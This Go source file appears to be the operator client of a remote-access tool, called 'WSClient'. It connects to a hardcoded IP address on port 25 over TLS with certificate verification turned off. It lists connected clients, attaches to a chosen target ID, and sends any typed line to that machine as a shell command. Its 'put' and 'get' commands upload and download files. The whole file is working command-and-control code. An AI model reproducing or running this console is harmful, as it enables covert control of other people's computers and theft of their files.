package main

import (
	T "./tcenter"
	S "./ssl"
	"flag"
	"github.com/op/go-logging"
	"os"
	"time"
	"bufio"
	"strings"
	"crypto/tls"
	"fmt"
)


var connectString = "173.230.150.215:25"
var groupID = "test"

func main() {
	var targetID string

	if len(connectString)==0 {
		os.Exit(0)
	}

	// init log config
	//format := logging.MustStringFormatter(`%{time:15:04:05.000} > %{message}`)
	format := logging.MustStringFormatter(`%{message}`)
	backend2 := logging.NewLogBackend(os.Stderr, "", 0)
	backend2Formatter := logging.NewBackendFormatter(backend2, format)
	logging.SetBackend(backend2Formatter)

	println("#####################################")
	println("## WSClient", T.DefaultVersion)
	println("#####################################")
	println("")

	// 获取用户参数
	var id = flag.String("id", "", "target id")
	var list = flag.Bool("l", false, "list client(s)")
	flag.Parse()

	if *list {
		directory := &T.DirectoryCenter{}

		// init ssl
		cert, err := S.ClientCert()
		directory.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true,
			Certificates:       []tls.Certificate{cert},
		}

		// connect wscenter
		err = directory.Dial(connectString)
		if err != nil {
			println("link Error", err.Error())
			os.Exit(0)
		}
		directory.Listen()
		directory.GetList(groupID)

		time.Sleep(time.Duration(10) * time.Second)
		os.Exit(0)
	}

	if *id == "" {
		flag.PrintDefaults()
		os.Exit(0)
	}

	// 记录到日志文件
	logFilename := fmt.Sprintf("data\\%s\\%s.log", *id, time.Now().Format("20060102"))
	logFile, err := os.OpenFile(logFilename, os.O_WRONLY|os.O_APPEND|os.O_CREATE,0666)
	format = logging.MustStringFormatter(`%{time:15:04:05.000} > %{message}`)
	backend1 := logging.NewLogBackend(logFile, "", 0)
	backend1Formatter := logging.NewBackendFormatter(backend1, format)
	backend1Leveled := logging.AddModuleLevel(backend1)
	backend1Leveled.SetLevel(logging.INFO, "")
	logging.SetBackend(backend1Formatter, backend2Formatter)

	// 启动客户端
	wscenter := T.WSCenter{}

	// init ssl
	cert, err := S.ClientCert()
	wscenter.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		Certificates:       []tls.Certificate{cert},
	}

	// connect wscenter
	err = wscenter.Dial(connectString)
	if err != nil {
		println("link error", err.Error())
	}

	// connect target
	targetID = *id
	wscenter.Connect(targetID)

	// 等待用户输入
	for {
		inputReader := bufio.NewReader(os.Stdin)
		input, _ := inputReader.ReadString('\n')
		inputString := strings.Trim(input, "\r\n")

		// 判断命令
		s := strings.Split(inputString, " ")
		if s[0] == "put" {
			if len(s) != 3 {
				println("usage: put local_file remote_file")
			} else {
				err := wscenter.SendUploadFile(s[1], s[2])
				if err != nil {
					println(err.Error())
				}
			}
		} else if s[0] == "get" {
			if len(s) != 2 {
				println("usage: get remote_file")
			} else {
				err := wscenter.SendDownloadFile(s[1])
				if err != nil {
					println(err.Error())
				}
			}
		} else {
			wscenter.SendShell(inputString+"\n")
		}
	}
}